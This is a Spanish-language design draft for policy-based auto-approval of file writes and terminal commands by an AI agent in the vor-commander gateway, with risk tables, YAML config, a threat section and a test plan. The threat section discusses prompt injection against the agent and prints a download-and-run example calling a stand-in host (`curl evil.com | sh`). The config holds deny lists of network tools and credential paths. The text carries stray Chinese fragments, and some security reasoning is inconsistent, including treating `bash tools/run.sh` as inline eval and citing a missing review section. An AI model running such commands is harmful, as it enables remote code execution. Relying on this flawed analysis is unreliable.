> **Estado: BORRADOR con revision obligatoria.** Borrador del 25-sep-2026 elaborado a partir de vor-policy, vor-core, vor-approval, vor-fs, vor-terminal, la politica de ejemplo y los handlers MCP. Decision del dueno: modo por defecto "aprobacion por politica" para el piloto por instalacion. La seccion final "Revision de seguridad" prevalece sobre el texto del borrador donde se contradigan.

# Diseño de aprobación por política para vor-commander

**Documento:** `docs/POLICY_APPROVAL_DESIGN.md`
**Estado:** propuesta para revisión del dueño
**Compatibilidad:** preserva el camino firmado `prepare_*`/`commit_*` existente; añade un camino "un solo paso" auto-aprobado por política.
**Piloto:** una sola organización, un solo dispositivo, un solo agente por gateway.

---

## 0. Resumen ejecutivo

Hoy, en `crates/vor-core/src/lib.rs` (`Broker::authorize_at` + `Broker::consume_approval_at`) y en `apps/vor-gateway/src/lib.rs` (`prepare_write_mcp`, `commit_write_mcp`, `prepare_terminal_mcp`, `commit_terminal_mcp`), **toda** escritura y **toda** ejecución de terminal exige dos saltos autenticados: un `prepare_*` que solo emite un reto de aprobación y un `commit_*` con un `SignedApproval` verificado por `ApprovalVerifier::verify`. Es seguro, pero en la práctica Desktop Commander gana en ergonomía porque el asistente escribe y ejecuta directamente.

La propuesta cambia el **modo por defecto** a **aprobación por política**: el motor decide si la acción es auto (ejecuta y audita), requiere firma, o se deniega. El camino firmado existente se conserva como `mode: strict` para el piloto y para quien lo pida.

Tres invariantes no se tocan:

1. **Toda** escritura de fichero y **toda** ejecución de proceso pasa por el `Broker` (`vor_core::Broker`), por la evaluación de `PolicyEngine` (`vor_policy::PolicyEngine::evaluate`) y por una entrada en el ledger antes y después del efecto.
2. El `SignedApproval` y `ApprovalVerifier` (`crates/vor-approval/src/lib.rs`) siguen siendo la única vía parasaltar una decisión `Approval` o `ElevatedApproval`.
3. La unicidad de consumo (`ledger.claim_approval_consumed`) sigue haciendo inviolable el "un solo uso" cuando hay firma.

---

## 1. Clasificación de riesgo por acción y parámetros

### 1.1 Regla general de tres niveles

`PolicyEngine::evaluate` ya emite tres clases (`RuleDecision::Auto | Approval | ElevatedApproval | Deny`). El modo por defecto solo añade reglas finas dentro de cada acción. La frontera se justifica en cada caso.

### 1.2 Filesystem (`filesystem.write` y `filesystem.read`)

La resolución de rutas se hace en `vor_policy::PolicyEngine::filesystem_decision` y la protección de traversal en `normalize_windows_path` (rechaza `..`, rutas relativas y rutas con `:`) más `FsWorker::ensure_no_parent_dir` y `reject_reparse_components` en `crates/vor-fs/src/lib.rs`. El matching ya toma la regla **más específica** por prefijo más largo, lo que permite solapar reglas finas sobre reglas gruesas.

| Acción | Parámetro / situación | Decisión | Justificación |
|---|---|---|---|
| `filesystem.write` | Crear fichero nuevo bajo `D:\Proyectos\…` (no existe) | `AUTO` | No sobrescribe nada; revertir es trivial (borrar). |
| `filesystem.write` | Sobrescribir fichero existente bajo `D:\Proyectos\…` con `expected_target_sha256` presente y dentro de límite de tamaño | `AUTO` con precondition | `FsWorker::write` exige `content_sha256` y `expected_target_sha256` y verifica antes y después del `MoveFileExW` (ver `required_content_digest`, `verify_target_precondition`, `PostWriteVerificationFailed`). El digest previo ata el commit a un estado concreto y el post-write rehace el hash del fichero ya en su sitio. |
| `filesystem.write` | Sobrescribir pero **sin** `expected_target_sha256` o con `absent` sobre un fichero que sí existe | `APPROVAL` | Sin precondition no se distingue "crear" de "machacar"; el commit ciego a un fichero preexistente es lo que el modo firmado quería evitar. |
| `filesystem.write` | Cualquier escritura bajo `D:\Proyectos\10_Active\vor-commander\state\local\m1-canary` | `APPROVAL` (regla explícita) | El ejemplo `policy.example.yaml` ya marca esa ruta como `write: approval` aunque esté bajo `D:\Proyectos`; el "más específico gana" lo respeta. Sirve para areneros. |
| `filesystem.write` | Borrar (`fs::remove_file` no existe en el worker, no es un endpoint expuesto) | siempre `APPROVAL` (operación dedicada `filesystem.delete`) | Borrar no es recuperable sin backup; aunque el worker actual no lo expone, el contrato MCP `delete_file` se modela como acción separada y exige firma. |
| `filesystem.write` | Mover fuera de la raíz permitida (cambio de padre) | `APPROVAL` | El worker resuelve el destino con `resolve_write_target`, que exige que el padre canónico esté dentro de `allowed_roots`. Si la operación es un rename跨界 se bloquea aquí; si está dentro pero cruza directorios protegidos, cae en la regla de ese directorio. |
| `filesystem.write` | `.git/`, `.ssh/`, `.env`, `.aws/`, `.gnupg/`, scripts de arranque (`*.bat`, `*.cmd`, `*.ps1`, `*.psm1`, `*.vbs`, `*.js` en `Startup/`, `*.service` en Linux, `launchd` plists), `C:\Windows\**`, `C:\Program Files\**` | `APPROVAL` o `ELEVATED_APPROVAL` | Estos ficheros cambian el comportamiento del sistema o exponen secretos. La política por defecto los declara con `elevated_approval` o `approval` (ver `policy.example.yaml`: `C:\Windows` está en `elevated_approval`). En piloto, una regla dedicada nueva los enumera explícitamente; si la enumeración no cubre un patrón, el matching por prefijo más largo garantiza que `D:\Proyectos` no las tapa (la regla sensible es más profunda o se evalúa antes por especificidad). |
| `filesystem.write` | Tamaño > `max_auto_write_bytes` (por defecto **1 MiB**, igual al `MAX_MCP_WRITE_BYTES` del gateway) | `APPROVAL` | Coherente con el límite del gateway; escrituras grandes son atípicas y se firman. |
| `filesystem.write` | MIME/ejecutable detectado por extensión (`*.exe`, `*.dll`, `*.com`, `*.scr`, `*.msi`) | `APPROVAL` | Crear un binario ejecutable bajo la carpeta de proyecto es un caso típico de "escribir y luego ejecutar"; pedir firma corta la cadena simple. |
| `filesystem.write` | Reparse point / symlink en cualquier componente del path | `DENY` (FS worker) | Ya lo aplica `reject_reparse_components` en `vor-fs`. |
| `filesystem.read` | Bajo `D:\Proyectos` | `AUTO` | Solo lectura; el ledger audita. |
| `filesystem.read` | Bajo `C:\Users\…` con ficheros sensibles (`.ssh`, `.aws`, `.gnupg`, `.env`) | `APPROVAL` | Lectura de material clave es el primer paso de muchos ataques. |
| `filesystem.read` | Tamaño > `max_auto_read_bytes` | `APPROVAL` | Lecturas masivas suelen ser exfiltración. |

### 1.3 Terminal (`terminal.exec` y derivados)

`vor_policy::command_is_inline_eval` ya distingue `python -c`, `node -e`, `pwsh -Command`, `bash -c`, `wsl … bash -lc`, etc. La propuesta preserva esa clasificación y le añade límites declarativos.

| Caso | Decisión | Justificación |
|---|---|---|
| Comando de una **lista permitida explícita** (`allow_command_prefixes`), sin redirecciones, sin pipes, todos los argumentos dentro de la working dir | `AUTO` | Una `git status`, `cargo check --offline`, `pytest -q tests/`, `node tools/lint.js` son efectos reversibles y observables. |
| Comando cuyo ejecutable está en la lista, pero el argv contiene `>`, `>>`, `<`, `|`, `&`, `&&`, `||`, `` ` ``, `$()`, redirección a path absoluto o a path fuera de la working dir, o un argumento `--output`/`-o` con valor fuera de la working dir | `APPROVAL` | Las redirecciones convierten un comando benigno en una escritura o lectura fuera de control. Es el mismo razonamiento por el que `desktop-commander` las pide por defecto. |
| Comando **fuera** de la lista pero inofensivo (un binario nuevo del proyecto) | `APPROVAL` (no `DENY`) | El dueño puedefirmarlo puntualmente; denegarlo silencioso rompería el flujo "probar y agregar". |
| `python -c …`, `node -e …`, `bash -c …`, `pwsh -Command …`, `cmd /C …`, `wsl … bash -lc …` (cualquier `command_is_inline_eval` verdadero) | `ELEVATED_APPROVAL` | El flag `terminal.inline_eval` ya vale `elevated_approval` por defecto. Inline eval es el vector rey de prompt injection porque mete código no revisado. |
| Cualquier comando de red saliente sin estar en `allow_network_targets` (`curl`, `Invoke-WebRequest`, `wget`, `ssh`, `scp`, `rsync` con destino no listado, `ncat`, `nslookup`) | `APPROVAL` con `required_capability = "elevated"` | La política por defecto ya marca `network.public_listener_fallback: deny`. El piloto añade una capa de denegación por defecto para tráfico saliente del agente. |
| Comandos que modifican el sistema (`sc.exe`, `net user`, `wevtutil cl`, `bcdedit`, `powercfg`, `reagentc`, `reg.exe` en hives sensibles, `schtasks /create`, `New-ScheduledTask`) | `APPROVAL` con `required_capability = "elevated"` y denegación por defecto para los hives sensibles | Persistencia y elevación. |
| Instaladores (`msiexec`, `winget`, `choco`, `apt`, `dnf`, `pip install` global, `npm i -g`, `Add-AppxPackage`) | `APPROVAL` con `required_capability = "elevated"` | Cambian el sistema fuera del sandbox del agente. |
| Tamaño de argv > `max_argc` o bytes > `max_arg_bytes` | `APPROVAL` | El `BoundedTerminal::prepare` ya valida esto (`ArgumentCountExceeded`, `ArgumentBytesExceeded`); la política lo refleja. |
| `cwd` fuera de `allowed_roots` | `DENY` (FS worker) | Ya implementado en `BoundedTerminal::prepare` → `CwdOutsideAllowedRoots`. |
| Sesiones persistentes (`terminal.poll`, `terminal.cancel`) | `AUTO` | No inician un proceso nuevo; el `TerminalSessionManager` ya exige `TerminalSessionOwner` y limita a 4 sesiones por defecto. |

### 1.4 Process (`process.list`, `process.inspect`, `process.terminate`)

Sin cambios respecto a `policy.example.yaml`. `list`/`inspect` siguen `AUTO`; `terminate` sigue `APPROVAL`. La regla fina adicional: `terminate` sobre PIDs que el dueño haya marcado como "críticos" (lista configurable) requiere `ELEVATED_APPROVAL`. El worker de procesos ya exige identidad exacta por `FILETIME` (ver `CAPABILITY_MATRIX.md`, fila "Process terminate" con `PASS_LOCAL_HARDENED`).

### 1.5 Browser (`browser.*`)

Sin cambios: `authenticated_session_use` y `publish` → `APPROVAL`; `secret_extraction` y `purchase` → `DENY` (la política actual ya lo declara).

### 1.6 Desktop (`desktop.*`)

`policy.example.yaml` declara `desktop.enabled: false`. En piloto se mantiene. Cualquier acción `desktop.*` da `DENY` por `desktop_disabled` salvo que el dueño lo habilite explícitamente (lo que lo convierte en `APPROVAL` por defecto).

### 1.7 Network (`network.public_listener_fallback`)

`DENY` por defecto. La regla `network.transports.priority` ya ordena LAN gRPC → Tailscale gRPC → Cloudflare WSS → Relay WSS. No se relaja en piloto.

---

## 2. Encaje en el código actual sin romper el camino firmado

### 2.1 Dónde se decide

La decisión vive en un solo sitio: `PolicyEngine::evaluate` (`crates/vor-policy/src/lib.rs`). El `Broker` ya lo llama desde `Broker::authorize_at` (`crates/vor-core/src/lib.rs`). El cambio es:

1. Ampliar `PolicyConfig` con `filesystem.auto_write`, `filesystem.sensitive_globs`, `filesystem.max_auto_write_bytes`, `filesystem.max_auto_read_bytes`, `terminal.allow_command_prefixes`, `terminal.allow_network_targets`, `terminal.deny_argv_patterns`, `terminal.max_argc`, `terminal.max_arg_bytes`, `mode` (`policy_approval` | `strict`).
2. Refinar `PolicyEngine::evaluate` para que, cuando `decision.kind == Auto`, evalúe las reglas finas anteriores (tamaño, sensitive globs, redirecciones). Si la regla fina rechaza, eleva a `Approval` con `reason_code` específico (`auto_write_size_exceeded`, `auto_write_sensitive_path`, `auto_terminal_redirect`, `auto_terminal_not_allowlisted`). Esta elevación es **invisible para el resto del código**: el `Broker` ve la misma `PolicyDecision`.
3. El `mode: strict` se implementa como un *override* en `PolicyEngine::evaluate`: si `mode == strict`, **toda** `Approval` no elevada se queda como está y **toda** `Auto` para `filesystem.write` y `terminal.exec` se eleva a `Approval` (con `reason_code = "strict_mode"`). Las acciones que ya eran `ElevatedApproval` o `Deny` no se tocan. Esto preserva el comportamiento actual al 100%.

### 2.2 Qué cambia en los handlers MCP del gateway

`apps/vor-gateway/src/lib.rs` ya tiene dos caminos: `dispatch_mcp` (sin preparación, hoy usado para `read_file`, `git_status`, `process_list`, etc.) y `prepare_*_mcp`/`commit_*_mcp` (camino firmado). La propuesta añade herramientas nuevas **de un solo paso** que van por `dispatch_mcp`:

- `write_file(device_id, workspace_id, path, content_base64, expected_target_sha256)`: construye un `ActionRequest` con `action = "filesystem.write"` y los parámetros `content_sha256` + `expected_target_sha256` (reutiliza `build_remote_write_request` pero el helper interno se separa para no duplicar la validación), llama `dispatch_action` y devuelve el resultado directo. Si la `PolicyDecision` resulta ser `Approval`, el gateway convierte el resultado en un error estructurado (`policy_decision: "approval_required"`, `reason_code`, `challenge`) **sin ejecutar** nada, igual que hace hoy `prepare_write` cuando el dispositivo devuelve `status = "approval_required"`. El cliente puede entonces encadenar `prepare_write`/`commit_write` con el reto recibido.
- `run_command(device_id, workspace_id, cwd, argv, timeout_ms, max_output_bytes, columns, rows)`: análogo para `terminal.exec`. Si el policy engine decide `Approval` o `ElevatedApproval`, el gateway responde con `approval_required` y el `ApprovalChallenge` ya serializado para que el cliente reintente por `commit_terminal`.

Las herramientas `prepare_write`/`commit_write`/`prepare_terminal`/`commit_terminal` **no se eliminan ni se modifican**. Siguen siendo el camino firmado. En modo `policy_approval` se siguen usando para las acciones que la política eleva a `Approval`; en modo `strict` son obligatorias para toda mutación.

`remote_tool_error` y `render_tool_output` siguen dando el mismo formato JSON (`status`, `content_type`, `encoding`, `data`, `digest_base64`); solo se añade un campo opcional `policy_decision` cuando la acción fue auto-aprobada localmente.

### 2.3 Auditoría distinguible

Hoy `Broker::authorize_at` escribe una fila `outcome = "auto" | "approval" | "deny"` antes de cualquier efecto, y `Broker::audit_outcome` escribe otra fila con `outcome = "ok"` o el error concreto. La propuesta añade un **reason_code de política** al `AuditEvent`:

- `outcome = "auto"` para efectos auto-aprobados por política (sin firma): `reason_code` se rellena con el `reason_code` de la `PolicyDecision` (`filesystem_rule`, `terminal_default`, etc.) y, si se elevó, con el `reason_code` específico del refinamiento (`auto_write_size_exceeded`, etc.). El ledger lo guarda como nueva columna (additive, no rompe serializaciones previas si se hace opcional con default vacío).
- `outcome = "approval_verified"` y `outcome = "approval_consumed"` se mantienen tal cual para los efectos firmados.
- Para que un revisor externo pueda distinguir de un vistazo, la UI del dashboard colorea distinto las filas `auto` con `required_capability` poblada (que en realidad nunca ocurre porque `Auto` no lleva capability; la regla fina *eleva* a `Approval` cuando hay duda) y obliga a mostrar el `reason_code`.

`AuditEvent` se amplía con `policy_reason_code: String` (ver `crates/vor-audit` si existe; si no, se hace opcional con `#[serde(default)]`). No se cambia ningún campo existente, así que las pruebas de `vor-core` que comparan `last_sequence()` siguen pasando.

### 2.4 Funciones reales citadas

- Decisión: `vor_policy::PolicyEngine::evaluate` → `filesystem_decision` → `terminal_exec_decision` → `command_is_inline_eval`.
- Aprobación: `vor_approval::ApprovalChallenge::issue`, `vor_approval::sign_approval`, `vor_approval::ApprovalVerifier::verify`.
- Broker: `vor_core::Broker::authorize_at`, `Broker::consume_approval_at`, `Broker::audit_outcome_at`.
- Filesystem: `vor_fs::FsWorker::write` (precconditions `required_content_digest` + `required_target_precondition`), `ensure_no_parent_dir`, `reject_reparse_components`, `atomic_replace`.
- Terminal: `vor_terminal::BoundedTerminal::prepare` (`EmptyArguments`, `ArgumentCountExceeded`, `InvalidTimeout`, `InvalidOutputLimit`, `CwdOutsideAllowedRoots`), `argv_to_windows_command_line`.
- Gateway: `build_remote_write_request`, `build_remote_terminal_request`, `build_remote_request`, `dispatch_mcp`, `prepare_write_mcp`, `commit_write_mcp`.

---

## 3. Qué puede configurar el dueño y valores por defecto seguros

Todo va a `config/policy.example.yaml`, validado por `PolicyEngine::from_yaml_str`. El parser ya exige `version: 1` y `policy_id` no vacío, así que extender el esquema es compatible hacia atrás.

### 3.1 Bloque nuevo

```yaml
mode: policy_approval      # policy_approval | strict. Default: policy_approval.

filesystem:
  auto_write:
    max_bytes: 1048576     # 1 MiB; coherente con MAX_MCP_WRITE_BYTES
    max_files_per_minute: 60
  auto_read:
    max_bytes: 4194304     # 4 MiB
    max_files_per_minute: 120
  sensitive_globs:
    - "**/.git/**"
    - "**/.ssh/**"
    - "**/.env"
    - "**/.aws/**"
    - "**/.gnupg/**"
    - "**/Startup/**"
    - "**/*.bat"
    - "**/*.cmd"
    - "**/*.ps1"
    - "**/*.psm1"
    - "**/*.vbs"
    - "**/*.exe"
    - "**/*.dll"
    - "**/*.msi"
  # Las reglas por prefijo (read/write) ya existentes se mantienen.

terminal:
  default: approval
  inline_eval: elevated_approval
  project_tests: auto
  destructive: approval
  elevated: elevated_approval
  allow_command_prefixes:
    - "git"
    - "cargo"
    - "rustc"
    - "node"
    - "npm"
    - "npx"
    - "pnpm"
    - "yarn"
    - "pytest"
    - "python"
    - "py"
    - "go"
    - "go test"
    - "make"
    - "cmake"
    - "msbuild"
    - "dotnet"
    - "pwsh"          # se eleva a elevated_approval si el argv es inline eval
  allow_network_targets:
    - "github.com"
    - "crates.io"
    - "registry.npmjs.org"
    - "pypi.org"
    - "files.pythonhosted.org"
    - "static.crates.io"
  deny_argv_patterns:
    - "&&"
    - "||"
    - ";"
    - ">"
    - ">>"
    - "<"
    - "|"
    - "`"
    - "$("
  max_argc: 128
  max_arg_bytes: 32768
```

### 3.2 Defaults seguros (modo `policy_approval`)

- **Filesystem**: `AUTO` solo en `D:\Proyectos` y subcarpetas que no estén en `sensitive_globs`, hasta 1 MiB por escritura. El resto del disco exige firma.
- **Terminal**: `AUTO` para comandos cuyo ejecutable está en `allow_command_prefixes` *y* cuyo argv no contiene ningún `deny_argv_patterns` *y* cuya `cwd` está dentro de las `allowed_roots` del worker. Cualquier desviación eleva a `APPROVAL` o `ELEVATED_APPROVAL`.
- **Inline eval**: `ELEVATED_APPROVAL` siempre (sin cambios).
- **Red saliente del agente**: bloqueada salvo targets en `allow_network_targets`; un comando de red no listado siempre devuelve `APPROVAL` con `required_capability = "elevated"`.
- **Mode strict**: el dueño puede poner `mode: strict` y恢复到 el comportamiento actual (todo `filesystem.write` y `terminal.exec` exige firma). Esto es lo que usaremos en el piloto durante las primeras dos semanas como sombra, antes de cambiar el default visible.

### 3.3 Modo estricto siempre disponible

El campo `mode` admite `strict`. En ese modo, `PolicyEngine::evaluate` aplica un *override* posterior: si la regla fina habría decidido `Auto` para una mutación, se eleva a `Approval` con `reason_code = "strict_mode"`. La interfaz MCP no cambia; el dueño solo edita el YAML y reinicia el agente (o recarga la política si se implementa hot-reload, que **no** entra en el piloto). Los tests de `vor-core::tests::signed_approval_is_consumed_once_and_survives_reopen` siguen siendo válidos porque ningún flujo firmado se altera.

---

## 4. Amenazas específicas y mitigaciones

### 4.1 Encadenar operaciones de bajo riesgo para lograr alto riesgo

El ejemplo canónico: "escribe `tools/run.sh` (auto) y luego ejecútalo (auto porque `bash` está en la lista)". Las mitigaciones son cuatro y se acumulan:

1. **Globs sensibles obligatorios.** `tools/run.sh` cae en `**/*.sh` solo si el dueño lo declara; por defecto **no** está en `sensitive_globs`. La propuesta lo añade como `**/*.sh`, `**/*.bash`, `**/*.zsh`, `**/*.ksh`, `**/*.fish` (cubre ejecutables *shell* y scripts interpretables), de forma que escribir un script ejecutable se eleva a `APPROVAL` aunque la carpeta sea `D:\Proyectos`. El ejecutarlo por `bash tools/run.sh` ya era `APPROVAL` por `inline_eval` (`bash -c`), y si se invoca como `./tools/run.sh` el ejecutable no está en `allow_command_prefixes`, así que también se eleva. **Resultado:** ambos pasos piden firma.
2. **Editar ficheros que otra herramienta ejecuta.** Si la herramienta es el propio agente, escribir `config/policy.yaml` no es directamente un endpoint; pero sí lo es escribir el `.git/hooks/pre-commit` (cae en `**/.git/**` → `APPROVAL`) o un `Makefile` que dispara `curl … | sh` (cae en redirección → `APPROVAL`). El refinamiento de redirecciones se hace parseando el argv en busca de los patrones de `deny_argv_patterns` **antes** de evaluar `default`; si aparecen, se eleva a `APPROVAL` aunque el ejecutable esté en la lista.
3. **Doble negación.** El refinamiento es *opt-out*, no *opt-in*: por defecto cualquier desviación de la regla fina eleva. El dueño puede relajar (borrar globs, ampliar la lista de comandos) pero el default seguro requiere firma.
4. **Tasa y correlación.** `auto_write.max_files_per_minute` y `auto_read.max_files_per_minute` (con ventana deslizante en el ledger) cortan intentos de escribir 500 ficheros en un segundo para preparar un payload.

### 4.2 Carreras entre comprobación y efecto

El filesystem ya mitiga con `MoveFileExW` + `REPLACE_EXISTING` + `WRITE_THROUGH` y con la verificación post-write (`sha256_file(&target)? != actual → PostWriteVerificationFailed`). Las carreras que aún existen son tres:

- **TOCTOU entre `prepare` y `commit`.** El reto de aprobación ya lleva `envelope_digest` y `approval_nonce` (`ApprovalChallenge`), y `verify_challenge_binding` rechaza cualquier request cuyo digest no coincida (`ApprovalError::ChallengeMismatch`). Si un atacante modifica el fichero entre `prepare_write` y `commit_write`, el hash pre-calculado por el gateway no coincidirá con el que el worker lee, y `verify_target_precondition` fallará con `TargetPreconditionFailed`. **No hay carrera.** La adición de modo auto-aprobado **no relaja** esto: el auto-aprobado ocurre dentro de un solo `Broker::authorize_at` → `FsWorker::write`, sin paso de usuario entre medias. La precondition sigue siendo obligatoria para sobrescritura.
- **Doble commit por doble click / doble request.** El ledger ya hace `claim_approval_consumed` con `INSERT … ON CONFLICT` semántico (`signed_approval_is_consumed_once_and_survives_reopen`). Para el camino auto, **cada `ActionRequest` lleva un `request_id` único y un `nonce` aleatorio**; el `Broker` rechaza el segundo intento porque `request.verify` falla por `DigestMismatch` o por `RequestReplay`. Hay que añadir un test de regresión explícito para el camino auto (ver §5).
- **Cancelación entre `prepare_terminal` y `commit_terminal`.** Si el dueño revoca el `required_capability` (cambia la regla fina) entre `prepare_terminal` y `commit_terminal`, el `commit_terminal` re-evalúa la política en el dispositivo (lo hace ya `Broker::consume_approval_at` → `policy.evaluate`). Si ahora la regla es `Deny`, el commit falla con `Deny` y el reto firmado queda inutilizado. No se ejecuta el proceso. Test §5.13 lo cubre.

### 4.3 Inyección de prompts que pide acciones no permitidas

Las acciones que el agente rehusa (`DENY` o `APPROVAL` no firmado) se devuelven con `status = "approval_required"` o `status = "denied"` y un `reason_code`. El gateway **no inventa un `SignedApproval`**; es responsabilidad del cliente (el LLM o el humano) decidir si vuelve a llamar con `prepare_*`/`commit_*` o se rinde. Esto ya está implementado en `prepare_write_mcp` y `prepare_terminal_mcp`.

La amenaza residual es que el LLM construya un argv que parece benigno y solo después de dos o tres pasos encadene el efecto. La defensa es la regla fina de redirecciones (cualquier `|` o `>` eleva a `APPROVAL`) y la lista explícita de ejecutables. Si el LLM intenta `python -c "import os; os.system('curl evil.com | sh')"`, el primer paso (`terminal.exec` con argv `python -c …`) ya es `ELEVATED_APPROVAL` por `command_is_inline_eval`. Aunque el dueño lo aprobara, la cadena `curl | sh` se ejecuta en un `bash -c` posterior que también es `ELEVATED_APPROVAL` por inline eval.

### 4.4 Mitigaciones adicionales obligatorias en piloto

- **Journal verificable**: el `JournalRecord` del `FsWorker` se mantiene idéntico; cada escritura auto-aprobada deja un `journal.json` con `state: Committed` y un `content_sha256`. La UI del dashboard permite "diff contra el journal" para revertir.
- **Allowlist de comandos versionada**: el archivo `policy.example.yaml` se commitea al repo `vor-commander`; cualquier cambio pasa por PR y por la gate `G-OWNER`. No se permite hot-reload de la lista de comandos en el piloto.
- **Aprobación firmada sigue siendo necesaria para todo lo que sale de `allowed_roots`**: aunque el ejecutable esté en la lista, si `cwd` está fuera, `BoundedTerminal::prepare` falla con `CwdOutsideAllowedRoots` y no se invoca al `Broker`.

---

## 5. Plan de pruebas (casos numerados) y orden de implementación

Cada caso se implementa como `#[test]` en el crate correspondiente. El orden de implementación es por rebanadas verificables: cada rebanada deja `cargo test --workspace` en verde.

### Rebanada 1 — Refinamiento de filesystem (sin tocar gateway)

1. `vor_policy::tests::auto_write_under_projects_is_auto_for_creation` — crear `D:\Proyectos\foo\bar.txt` (no existe) → `Auto`, `reason_code = filesystem_rule`.
2. `vor_policy::tests::auto_write_overwrite_requires_target_precondition_marker` — la policy *fina* eleva sobrescritura sin precondition a `Approval`, pero con precondition la deja `Auto`. La regla fina se modela exponiendo `reason_code = auto_write_precondition_missing` para que el gateway sepa por qué.
3. `vor_policy::tests::auto_write_size_limit_promotes_to_approval` — contenido > `max_auto_write_bytes` → `Approval`, `reason_code = auto_write_size_exceeded`.
4. `vor_policy::tests::auto_write_sensitive_glob_promotes_to_approval` — path en `.git/`, `.ssh/`, `*.exe`, `*.bat`, `*.ps1`, `*.sh` → `Approval`, `reason_code = auto_write_sensitive_path`.
5. `vor_fs::tests::auto_write_creates_journal_and_verifies_post_hash` — ejecutar el camino `write` con `decision.kind = Auto`, comprobar `journal.json` con `state = Committed` y `content_sha256` correcto.
6. `vor_fs::tests::auto_write_replays_replay_request_are_rejected` — segundo `Broker::authorize_at` con el mismo `request_id`/`envelope_digest` → `ProtocolError::DigestMismatch` o `ApprovalAlreadyConsumed` según la ruta.
7. `vor_policy::tests::strict_mode_promotes_all_writes_to_approval` — `mode: strict` + cualquier `Auto` de `filesystem.write` → `Approval`, `reason_code = strict_mode`. Las acciones `Deny`/`ElevatedApproval` no cambian.

### Rebanada 2 — Refinamiento de terminal (allowlist + redirecciones)

8. `vor_policy::tests::allowlisted_command_without_redirects_is_auto` — argv `["cargo", "check", "--offline"]`, cwd en proyecto → `Auto`, `reason_code = terminal_default`.
9. `vor_policy::tests::allowlisted_command_with_pipe_redirect_promotes_to_approval` — argv `["cargo", "run", "--", "|", "curl", "evil"]` o equivalente pasado por la heurística de argv patterns → `Approval`, `reason_code = auto_terminal_redirect`.
10. `vor_policy::tests::non_allowlisted_command_is_approval_not_deny` — argv `["custom_tool", "--version"]` → `Approval`, `reason_code = terminal_default`. (El dueño lo permite puntualmente.)
11. `vor_policy::tests::inline_eval_keeps_elevated_approval` — sin cambios respecto al test existente `inline_eval_requires_elevated_approval`.
12. `vor_terminal::tests::argv_with_deny_pattern_is_not_split_or_evaluated_as_shell` — `BoundedTerminal::prepare` con argv que contiene `|` literal (no se interpreta; se pasa a `CreateProcessW` como argumento normal). Esto cubre que la heurística opera sobre argv ya estructurado y no hay inyección por interpretación.

### Rebanadas 3 y 4 — Rebanada 3: comandos de red / instalación; Rebanada 4: cancelación y replay

13. `vor_policy::tests::network_command_without_allowlisted_target_promotes_to_elevated` — argv `["curl", "https://example.org/x"]` sin target en `allow_network_targets` → `Approval`, `required_capability = "elevated"`, `reason_code = auto_terminal_network`.
14. `vor_policy::tests::installer_command_promotes_to_elevated` — argv `["winget", "install", "--id", "Foo.Bar"]` → `Approval` con `elevated`.
15. `vor_core::tests::auto_terminal_cancel_replays_replay_does_not_spawn` — el dueño cancela la sesión entre `authorize` y `commit`; el ledger rechaza el replay con `ApprovalAlreadyConsumed` y `BoundedTerminal` no llega a `CreateProcessW`.

### Rebanada 5 — Modo `strict` y compatibilidad hacia atrás

16. `vor_policy::tests::strict_mode_preserves_deny_and_elevated` — `mode: strict` no convierte `Deny` en `Approval` ni quita `ElevatedApproval`.
17. `vor_core::tests::strict_mode_signed_path_still_works` — mismo flujo que `signed_approval_is_consumed_once_and_survives_reopen`, pero con `policy_id = "strict-mode"`. Verifica que el camino firmado existente sigue idéntico.
18. `apps::vor_gateway::tests::write_file_tool_returns_auto_receipt_when_policy_allows` — stub de `dispatch_action` que devuelve `status = "ok"`, comprobar que `write_file` lo serializa con `status: "ok"`, `policy_decision: "auto"`, `reason_code: "filesystem_rule"`.
19. `apps::vor_gateway::tests::write_file_tool_returns_approval_required_when_policy_denies_auto` — stub devuelve `status = "approval_required"`; `write_file` responde con el `ApprovalChallenge` y `request_base64` exactamente igual que `prepare_write`.
20. `apps::vor_gateway::tests::run_command_tool_returns_auto_receipt_when_allowlisted` — análogo para terminal.
21. `apps::vor_gateway::tests::run_command_tool_does_not_spawn_when_redirect_detected` — argv con `|` → respuesta `approval_required` con `reason_code = "auto_terminal_redirect"`, sin que `BoundedTerminal` se haya invocado.

### Rebanada 6 — Amenazas y regresiones

22. `vor_policy::tests::write_then_exec_chain_both_require_signature` — secuencia `filesystem.write` a `tools/run.sh` (cae en `**/*.sh` → `Approval`) seguida de `terminal.exec` con `bash tools/run.sh` (cae en `inline_eval` → `ElevatedApproval`). Ambos `decision.kind == Approval` y la segunda con `required_capability = "elevated"`.
23. `vor_policy::tests::write_then_exec_chain_breaks_if_owner_removes_shell_glob` — el dueño edita la política y borra `**/*.sh`; la escritura pasa a `Auto` pero la ejecución sigue siendo `ElevatedApproval` por `command_is_inline_eval`. **La defensa en profundidad se mantiene.**
24. `vor_core::tests::rate_limit_blocks_auto_write_flood` — 61 escrituras en un minuto bajo la misma `(actor_id, device_id)` → la 61ª falla con `RateLimited`. Implementación: ventana deslizante en el ledger con `auto_write_count`.
25. `apps::vor_gateway::tests::tampered_request_base64_after_auto_is_rejected` — el cliente edita un byte de `request_base64`; el worker detecta `DigestMismatch` y no escribe.

### Orden de implementación (rebanadas pequeñas verificables)

1. **Rebanada 1 (filesystem fino)**: ampliar `PolicyConfig`, refinar `PolicyEngine::evaluate`, añadir campos opcionales en `AuditEvent`, tests 1–7. Commit: "policy: refine auto filesystem write".
2. **Rebanada 2 (terminal allowlist + redirects)**: tests 8–12. Commit: "policy: refine auto terminal exec".
3. **Rebanada 3 (red/instaladores)**: tests 13–14. Commit: "policy: gate network and installers behind elevated".
4. **Rebanada 4 (cancelación/replay)**: test 15. Commit: "policy: ensure auto terminal cancel does not spawn".
5. **Rebanada 5 (modo strict + gateway tools)**: tests 16–21 + handlers `write_file`/`run_command`. Commit: "gateway: add one-step write_file and run_command tools".
6. **Rebanada 6 (amenazas)**: tests 22–25. Commit: "policy: chain and rate-limit regressions".

Cada rebanada termina con `cargo test --workspace` y `cargo clippy --workspace --all-targets -- -D warnings` en verde. El piloto se abre al dueño solo cuando las seis están en `main`.

---

## Lo que no pude comprobar

- **El camino real del gateway `write_file`/`run_command` de un solo paso**: el código que mostraste del gateway termina en `build_router_with_tenants_and_hub`, así que no vi la implementación completa de los nuevos tools ni dónde se serializa el `policy_decision` adicional en el `ToolOutput`. La sección 2.2 describe la interfaz prevista; el PR de la rebanada 5 tendrá que confirmar que `ToolOutput` admite un campo opcional nuevo sin romper el esquema JSON existente.
